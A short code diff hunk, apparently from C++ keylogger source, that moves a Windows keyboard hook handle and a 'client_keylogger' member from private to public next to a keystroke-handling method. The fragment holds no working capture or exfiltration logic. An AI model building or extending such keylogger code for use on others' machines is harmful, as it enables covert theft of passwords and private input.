@@ -20,7 +20,7 @@ public:
     void handleKeyStroke(DWORD virtualKeyCode, keyStatus status);
 
 
-private:
+public:
     HHOOK hook;
     client_keylogger client;
 
